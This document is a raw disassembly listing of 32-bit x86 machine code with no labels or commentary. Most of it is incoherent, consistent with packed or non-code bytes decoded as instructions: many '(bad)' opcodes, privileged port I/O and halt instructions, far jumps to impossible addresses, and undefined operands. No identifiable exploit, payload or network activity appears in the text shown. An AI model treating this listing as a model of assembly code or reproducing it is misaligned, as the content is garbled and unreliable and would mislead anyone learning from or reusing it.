  42f9e0:	loop   0x42fa31
  42f9e2:	dec    edx
  42f9e3:	or     BYTE PTR [ebp+0x4bb11508],0xa9
  42f9ea:	aas    
  42f9eb:	iret   
  42f9ec:	xchg   DWORD PTR [ebx],eax
  42f9ee:	cmp    eax,0x2bc074e9
  42f9f3:	retf   
  42f9f4:	xor    DWORD PTR [eax+0x3f],ebp
  42f9f7:	pusha  
  42f9f8:	push   0xffffff97
  42f9fa:	push   ebx
  42f9fb:	(bad)  
  42f9fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9fd:	pminub mm1,QWORD PTR [esi+edx*2]
  42fa01:	jmp    0x42fa26
  42fa03:	adc    eax,0x20fd379
  42fa08:	add    edx,DWORD PTR [esi+0xd7baa61]
  42fa0e:	mov    ah,0xac
  42fa10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa11:	dec    ebp
  42fa12:	inc    ebx
  42fa13:	xchg   DWORD PTR [eax-0x26],edx
  42fa16:	mov    edi,esi
  42fa18:	mov    ebp,0x37874531
  42fa1d:	mov    dh,0xe7
  42fa1f:	jo     0x42fa63
  42fa21:	and    edx,DWORD PTR [esp+ebp*4]
  42fa24:	jae    0x42fa57
  42fa26:	cmp    al,0xc6
  42fa28:	or     ecx,DWORD PTR [ebp-0x2affcebb]
  42fa2e:	aaa    
  42fa2f:	retf   
  42fa30:	shr    DWORD PTR [ecx],0xd
  42fa33:	int3   
  42fa34:	mov    ebx,0x36580eaf
  42fa39:	pop    ds
  42fa3a:	call   DWORD PTR [edx-0x2a]
  42fa3d:	int3   
  42fa3e:	call   0x791ba8c7
  42fa43:	out    dx,eax
  42fa44:	dec    eax
  42fa45:	leave  
  42fa46:	and    al,0x10
  42fa48:	push   ecx
  42fa49:	es dec edi
  42fa4b:	(bad)  
  42fa4c:	push   ecx
  42fa4d:	fiadd  WORD PTR [ebx-0x12]
  42fa50:	pop    esp
  42fa51:	inc    edi
  42fa52:	sbb    al,0x18
  42fa54:	cmc    
  42fa55:	or     eax,0x66751776
  42fa5a:	push   esp
  42fa5b:	rcr    DWORD PTR [edx+0x7420673c],0x8b
  42fa62:	addr16 mov edi,0x4764527f
  42fa68:	psraw  mm1,QWORD PTR [ebp+0x4b]
  42fa6c:	cmp    dl,bl
  42fa6e:	cs mov al,0x81
  42fa71:	mov    eax,ds:0x4954d5c4
  42fa76:	xchg   ebx,eax
  42fa77:	pop    esi
  42fa78:	and    DWORD PTR [ebx],esp
  42fa7a:	ins    DWORD PTR es:[edi],dx
  42fa7b:	inc    esi
  42fa7c:	stos   DWORD PTR es:[edi],eax
  42fa7d:	mov    al,ds:0xa54ec766
  42fa82:	xchg   BYTE PTR [eax-0x21f4e191],dh
  42fa88:	mov    ebp,0x38a9c3e2
  42fa8d:	gs sar bh,0x0
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	or     al,0x6e
  42fb02:	add    eax,0x1fe7c95
  42fb07:	add    BYTE PTR [ecx+eax*1],al
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	test   al,0x70
  42fb0e:	sub    BYTE PTR [edi],ch
  42fb10:	cdq    
  42fb11:	sbb    bh,BYTE PTR es:[edi+0x4a]
  42fb15:	retf   
  42fb16:	aaa    
  42fb17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb18:	xchg   edi,eax
  42fb19:	into   
  42fb1a:	push   0x37
  42fb1c:	mov    ah,0x66
  42fb1e:	stc    
  42fb1f:	add    edx,ebp
  42fb21:	popa   
  42fb22:	loope  0x42fb06
  42fb24:	inc    esp
  42fb25:	xlat   BYTE PTR ds:[ebx]
  42fb26:	jbe    0x42fb37
  42fb28:	addr16 in eax,dx
  42fb2a:	(bad)  
  42fb2b:	loopne 0x42fabb
  42fb2d:	outs   dx,BYTE PTR ds:[esi]
  42fb2e:	in     eax,0x4
  42fb30:	and    eax,0xc92b2e5e
  42fb35:	fidiv  WORD PTR [ebx+0x6dedea32]
  42fb3b:	push   edx
  42fb3c:	sub    eax,0xdf34cefc
  42fb41:	sbb    BYTE PTR [esi],bh
  42fb43:	call   0xf3ad:0x4d03067e
  42fb4a:	fstp   DWORD PTR [edi-0x3b2a6d45]
  42fb50:	dec    ebp
  42fb51:	push   esp
  42fb52:	sbb    ecx,DWORD PTR [ecx+0x3fed73c6]
  42fb58:	mov    ebx,0x8e2aa32c
  42fb5d:	sti    
  42fb5e:	pop    esp
  42fb5f:	sub    cl,BYTE PTR [edi+0x50]
  42fb62:	xor    BYTE PTR [eax-0x703ad600],dh
  42fb68:	adc    eax,0xcc73b3cc
  42fb6d:	push   eax
  42fb6e:	add    esi,DWORD PTR [edx+ebx*2+0x2a]
  42fb72:	jmp    FWORD PTR [eax+0x2a]
  42fb75:	das    
  42fb76:	xor    DWORD PTR [ecx+0x2c],ebp
  42fb79:	add    DWORD PTR [edi+0x7496869b],0xffffffae
  42fb80:	inc    ebx
  42fb81:	push   0xb55225de
  42fb86:	push   ss
  42fb87:	xchg   ecx,eax
  42fb88:	pop    eax
  42fb89:	lds    eax,FWORD PTR [ecx+0x586edb8b]
  42fb8f:	mov    cl,0x1d
  42fb91:	ss mov ebx,0xf6297cbc
  42fb97:	stos   DWORD PTR es:[edi],eax
  42fb98:	or     al,0x85
  42fb9a:	outs   dx,BYTE PTR ds:[esi]
  42fb9b:	push   0x6a01c6e5
  42fba0:	pop    esi
  42fba1:	fcom   DWORD PTR [edx-0x44cd2ca2]
  42fba7:	inc    ecx
  42fba8:	sub    ebx,DWORD PTR [eax+0xe]
  42fbab:	aas    
  42fbac:	psadbw mm5,mm0
  42fbaf:	leave  
  42fbb0:	rcl    DWORD PTR [edx-0x3f681c38],cl
  42fbb6:	pop    edx
  42fbb7:	clc    
  42fbb8:	xchg   edi,eax
  42fbb9:	xchg   esp,eax
  42fbba:	xor    BYTE PTR [esi+0x58],bh
  42fbbd:	hlt    
  42fbbe:	pop    esi
  42fbbf:	mov    ebx,0xebd2a586
  42fbc4:	out    dx,al
  42fbc5:	repz or eax,0x4eac257c
  42fbcb:	in     eax,dx
  42fbcc:	mov    esp,0x878b5d66
  42fbd1:	int    0xa6
  42fbd3:	adc    DWORD PTR [ecx],esi
  42fbd5:	mov    DWORD PTR [ebx],edx
  42fbd7:	inc    edi
  42fbd8:	or     ecx,DWORD PTR [ecx+0x74b61303]
  42fbde:	sub    eax,0xf7abfcc8
  42fbe3:	fcmove st,st(3)
  42fbe5:	mov    al,ds:0xc5e09d7
  42fbea:	ror    WORD PTR es:[ebp+0x2a],1
  42fbef:	(bad)  
  42fbf0:	mov    eax,ds:0xa02114ff
  42fbf5:	popa   
  42fbf6:	in     eax,0x18
  42fbf8:	jne    0x42fbe3
  42fbfa:	fs scas al,BYTE PTR es:[edi]
  42fbfc:	fcom   st(7)
  42fbfe:	(bad)  
  42fbff:	outs   dx,DWORD PTR ds:[esi]
  42fc00:	add    bl,BYTE PTR [edx-0x35]
  42fc03:	clc    
  42fc04:	sbb    edi,DWORD PTR [edx-0x29]
  42fc07:	add    bl,al
  42fc09:	mov    al,0x9d
  42fc0b:	pop    eax
  42fc0c:	sbb    al,0x21
  42fc0e:	jge    0x42fc78
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [ebp-0x7fb714bf],bh
  42fc85:	inc    DWORD PTR [ecx]
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	scas   eax,DWORD PTR es:[edi]
  42fc8d:	jg     0x42fc3f
  42fc8f:	mov    eax,0xec572233
  42fc94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc95:	(bad)  
  42fc96:	clc    
  42fc97:	jb     0x42fc55
  42fc99:	xor    DWORD PTR [esi],esi
  42fc9b:	lods   al,BYTE PTR ds:[esi]
  42fc9c:	icebp  
  42fc9d:	xchg   edi,eax
  42fc9e:	sub    dl,BYTE PTR [edx]
  42fca0:	jecxz  0x42fc86
  42fca2:	(bad)  
  42fca3:	aaa    
  42fca4:	or     edi,DWORD PTR [esi-0x3e]
  42fca7:	cmp    cl,BYTE PTR [eax]
  42fca9:	pop    ebx
  42fcaa:	pop    edi
  42fcab:	aam    0x57
  42fcad:	dec    esp
  42fcae:	pop    ds
  42fcaf:	call   0x8e4ad543
  42fcb4:	xchg   ebp,eax
  42fcb5:	cld    
  42fcb6:	mov    edx,DWORD PTR [ecx]
  42fcb8:	leave  
  42fcb9:	xor    eax,edx
  42fcbb:	xchg   ebx,eax
  42fcbc:	jae    0x42fcc3
  42fcbe:	inc    esp
  42fcbf:	pop    eax
  42fcc0:	sbb    BYTE PTR [ebx],bh
  42fcc2:	sbb    dh,dl
  42fcc4:	bound  edx,QWORD PTR [eax-0x6a60d06e]
  42fcca:	retf   
  42fccb:	jmp    0x42fd3c
  42fccd:	pop    esp
  42fcce:	sub    DWORD PTR ds:0x6c85b0b,esi
  42fcd4:	inc    ecx
  42fcd5:	fadd   QWORD PTR [ebp-0x74cc81fd]
  42fcdb:	fstp   DWORD PTR [ecx-0x6212dd2b]
  42fce1:	daa    
  42fce2:	in     al,dx
  42fce3:	cmc    
  42fce4:	pop    edi
  42fce5:	out    0xe2,al
  42fce7:	xchg   esp,eax
  42fce8:	jecxz  0x42fcff
  42fcea:	dec    eax
  42fceb:	and    eax,0x5cb1bb51
  42fcf0:	(bad)  
  42fcf1:	div    DWORD PTR [ebp-0x2de8c389]
  42fcf7:	adc    DWORD PTR [ecx+0x6a],esp
  42fcfa:	xchg   ebx,eax
  42fcfb:	sub    ebp,DWORD PTR [esi]
  42fcfd:	sbb    DWORD PTR [edi-0x366f4eb7],esi
  42fd03:	mov    bl,0xba
  42fd05:	repnz inc eax
  42fd07:	leave  
  42fd08:	rol    BYTE PTR [edi+0xb],0x68
  42fd0c:	xchg   edx,eax
  42fd0d:	cdq    
  42fd0e:	dec    esi
  42fd0f:	adc    esp,ebx
  42fd11:	sub    BYTE PTR [ebp-0x34],dl
  42fd14:	jnp    0x42fcbf
  42fd16:	cs sub al,al
  42fd19:	xchg   ecx,esp
  42fd1b:	outs   dx,DWORD PTR ds:[esi]
  42fd1c:	fisub  WORD PTR [esi]
  42fd1e:	out    0x60,eax
  42fd20:	(bad)  
  42fd21:	sbb    DWORD PTR es:[ebx+ecx*8+0x44],ecx
  42fd26:	jmp    0x42fd4b
  42fd28:	arpl   WORD PTR [eax-0x6b],si
  42fd2b:	sbb    bl,BYTE PTR [edx-0x26a2105]
  42fd31:	cmp    esp,ebp
  42fd33:	xor    ebp,DWORD PTR [ebp-0x4b]
  42fd36:	jne    0x42fccc
  42fd38:	retf   
  42fd39:	scas   al,BYTE PTR es:[edi]
  42fd3a:	jmp    0xa37:0x1d4e4602
  42fd41:	hlt    
  42fd42:	xor    eax,0xcb0654ea
  42fd47:	jno    0x42fd7c
  42fd49:	nop
  42fd4a:	push   edx
  42fd4b:	push   eax
  42fd4c:	mov    esp,DWORD PTR [edi+0x1920e347]
  42fd52:	dec    ebx
  42fd53:	loop   0x42fdb1
  42fd55:	push   eax
  42fd56:	jae    0x42fdc3
  42fd58:	xor    cl,BYTE PTR [eax]
  42fd5a:	fimul  WORD PTR ds:0x7d10ce63
  42fd60:	stos   BYTE PTR es:[edi],al
  42fd61:	js     0x42fd25
  42fd63:	push   edx
  42fd64:	and    BYTE PTR [esi],dh
  42fd66:	xchg   ecx,eax
  42fd67:	sbb    DWORD PTR [edi],edx
  42fd69:	xchg   edx,eax
  42fd6a:	rol    DWORD PTR [esi],1
  42fd6c:	cmp    DWORD PTR [ebp+0x29],esp
  42fd6f:	inc    esp
  42fd70:	mov    ecx,0xbce7a06d
  42fd75:	cdq    
  42fd76:	ror    BYTE PTR [edx+0x64],0xdb
  42fd7a:	mov    ebp,0x98d657dc
  42fd7f:	dec    DWORD PTR [ebp+0x77ed416f]
  42fd85:	mov    ds:0x45af3be3,eax
  42fd8a:	push   es
  42fd8b:	mov    esi,0xb0a1e512
	...
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz and DWORD PTR [esi],ebp
  42fe02:	jns    0x42fe07
  42fe04:	test   BYTE PTR [eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	mov    al,0x9a
  42fe0e:	dec    edi
  42fe0f:	adc    eax,0x571c64f2
  42fe14:	or     eax,0xe69a5824
  42fe19:	pop    esi
  42fe1a:	fwait
  42fe1b:	add    DWORD PTR [edx+0x74367d2f],edi
  42fe21:	xor    BYTE PTR [ebx-0x67],al
  42fe24:	cmp    DWORD PTR [edx+0x3b0b96c9],ecx
  42fe2a:	ja     0x42fe1a
  42fe2c:	daa    
  42fe2d:	jg     0x42fdda
  42fe2f:	xchg   ebx,eax
  42fe30:	aad    0x5
  42fe32:	cli    
  42fe33:	hlt    
  42fe34:	push   es
  42fe35:	call   0xdc0093a6
  42fe3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe3b:	sub    eax,ecx
  42fe3d:	ja     0x42fdf8
  42fe3f:	aaa    
  42fe40:	je     0x42feac
  42fe42:	mov    dh,0xea
  42fe44:	ins    DWORD PTR es:[edi],dx
  42fe45:	jl     0x42fe4e
  42fe47:	shl    BYTE PTR [eax+0x24],0x34
  42fe4b:	and    al,0x7a
  42fe4d:	ins    DWORD PTR es:[edi],dx
  42fe4e:	jge    0x42fe52
  42fe50:	inc    esi
  42fe51:	mov    eax,0x9b8c8861
  42fe56:	cmp    edi,DWORD PTR [edi+0xa37a3e0]
  42fe5c:	jo     0x42fe7b
  42fe5e:	and    al,0x7f
  42fe60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe61:	mov    al,0x8c
  42fe63:	mov    ebp,esi
  42fe65:	std    
  42fe66:	add    DWORD PTR [esi],ebp
  42fe68:	fcomi  st,st(7)
  42fe6a:	out    0xb5,eax
  42fe6c:	cdq    
  42fe6d:	pushf  
  42fe6e:	xchg   esp,eax
  42fe6f:	mov    ch,bl
  42fe71:	xchg   ebp,eax
  42fe72:	pusha  
  42fe73:	test   eax,0xb129d628
  42fe78:	loop   0x42fee8
  42fe7a:	iret   
  42fe7b:	jmp    0x42fefc
  42fe7d:	je     0x42fefb
  42fe7f:	cdq    
  42fe80:	push   0xcb28089f
  42fe85:	sar    BYTE PTR [edi-0xe],cl
  42fe88:	adc    ecx,esp
  42fe8a:	imul   ecx,DWORD PTR [edi+0x5e],0xaa35f4fd
  42fe91:	stos   BYTE PTR es:[edi],al
  42fe92:	and    dh,BYTE PTR [ebx+eax*1+0x51]
  42fe96:	mov    DWORD PTR [eax-0x3d6115c6],ebx
  42fe9c:	stos   DWORD PTR es:[edi],eax
  42fe9d:	call   0xb925a0dc
  42fea2:	mov    bh,0xe1
  42fea4:	fmul   st(6),st
  42fea6:	ret    0x62db
  42fea9:	shr    BYTE PTR [edi+ecx*8-0x2c],1
  42fead:	sbb    BYTE PTR [edx+0x55697508],0x59
  42feb4:	pop    edi
  42feb5:	retf   0x5ed6
  42feb8:	add    eax,0xafe74926
  42febd:	cmp    DWORD PTR ds:0xdc9dd493,0xb51e1b79
  42fec7:	cli    
  42fec8:	push   esi
  42fec9:	clc    
  42feca:	sti    
  42fecb:	outs   dx,DWORD PTR ds:[esi]
  42fecc:	fcom   DWORD PTR [eax+0x5c0fc113]
  42fed2:	out    0xfe,eax
  42fed4:	pop    es
  42fed5:	xchg   edx,eax
  42fed6:	jo     0x42ff44
  42fed8:	imul   eax,DWORD PTR [ecx+0x49],0x5b
  42fedc:	or     al,0xd2
  42fede:	aam    0x3c
  42fee0:	out    0x36,eax
  42fee2:	push   ebx
  42fee3:	push   ebx
  42fee4:	jno    0x42fe68
  42fee6:	xchg   esi,eax
  42fee7:	and    eax,0x7003a116
  42feec:	jecxz  0x42fedf
  42feee:	ja     0x42ff36
  42fef0:	mov    dh,0xc7
  42fef2:	scas   eax,DWORD PTR es:[edi]
  42fef3:	mov    ebp,0x14b4cc1e
  42fef8:	xchg   ah,bl
  42fefa:	inc    esi
  42fefb:	aas    
  42fefc:	aas    
  42fefd:	leave  
  42fefe:	xchg   esp,eax
  42feff:	or     DWORD PTR ds:0x7227b336,ebx
  42ff05:	ror    BYTE PTR [ebx-0x7],1
  42ff08:	mov    dh,0xdc
  42ff0a:	mov    dh,0xb9
  42ff0c:	xchg   dl,bl
  42ff0e:	sar    DWORD PTR ds:0x0,0x0
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [eax+eax*1-0x5d],0x42
  42ff83:	adc    al,0x88
  42ff85:	add    DWORD PTR [edx],eax
  42ff87:	add    BYTE PTR [eax+eax*1-0xe730000],bh
  42ff8e:	test   DWORD PTR [esi-0x3028d132],0x19398271
  42ff98:	inc    ecx
  42ff99:	push   ebx
  42ff9a:	xor    esi,edx
  42ff9c:	adc    eax,0xf93b54f0
  42ffa1:	adc    eax,0x848089bb
  42ffa6:	ret    
  42ffa7:	dec    edi
  42ffa8:	ret    
  42ffa9:	daa    
  42ffaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffab:	mov    bh,0x3a
  42ffad:	pop    ds
  42ffae:	pop    edi
  42ffaf:	and    edi,edx
  42ffb1:	loopne 0x42ff66
  42ffb3:	out    0xe8,eax
  42ffb5:	call   0x49fb69fe
  42ffba:	in     al,0xd0
  42ffbc:	cmp    BYTE PTR [edx-0x19],ah
  42ffbf:	mov    dl,0x32
  42ffc1:	repnz mov dh,0xc0
  42ffc4:	dec    eax
  42ffc5:	popa   
  42ffc6:	add    eax,edx
  42ffc8:	and    eax,0xe09b0c3e
  42ffcd:	adc    ch,BYTE PTR [ecx-0x39]
  42ffd0:	sbb    al,BYTE PTR [esi-0x2e]
  42ffd3:	loope  0x42ffa0
  42ffd5:	ret    
  42ffd6:	cmp    al,cl
  42ffd8:	jg     0x42fffa
  42ffda:	add    ch,al
  42ffdc:	push   es
  42ffdd:	enter  0xa61d,0xce
  42ffe1:	stos   BYTE PTR es:[edi],al
  42ffe2:	push   edx
  42ffe3:	repnz fwait
  42ffe5:	xchg   esi,eax
  42ffe6:	dec    ecx
  42ffe7:	aas    
  42ffe8:	push   esi
  42ffe9:	enter  0x67c0,0x52
  42ffed:	cmp    BYTE PTR [eax-0x80],ch
  42fff0:	out    dx,al
  42fff1:	ja     0x42ffd9
  42fff3:	jg     0x43004c
  42fff5:	ins    BYTE PTR es:[edi],dx
  42fff6:	cmp    eax,0x57da4778
  42fffb:	add    eax,eax
  42fffd:	and    DWORD PTR [ebp-0x30df6690],0x9063e5ac
  430007:	sbb    dh,BYTE PTR [ebp+edx*8-0x1d]
  43000b:	push   cs
  43000c:	rcr    ah,1
  43000e:	jp     0x42ffbd
  430010:	das    
  430011:	fcomp  DWORD PTR [ebx]
  430013:	test   eax,0xe6bc462
  430018:	and    al,0xfd
  43001a:	mov    al,0xa4
  43001c:	pop    ss
  43001d:	je     0x42ffd6
  43001f:	outs   dx,BYTE PTR ds:[esi]
  430020:	fs popa 
  430022:	jmp    0x453a2c48
  430027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430028:	sbb    eax,0xea19fec8
  43002d:	rol    BYTE PTR [eax+0x279a7199],cl
  430033:	jne    0x42ffde
  430035:	cmp    BYTE PTR [edi],ah
  430037:	sbb    al,0xf1
  430039:	outs   dx,BYTE PTR ds:[esi]
  43003a:	push   ebp
  43003b:	jbe    0x42fff1
  43003d:	or     BYTE PTR [edx],ch
  43003f:	inc    edi
  430040:	mov    ecx,0x71ebe808
  430045:	in     eax,dx
  430046:	mov    WORD PTR [edx+0x0],?
	...
  430074:	dec    ebp
  430075:	push   ebp
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
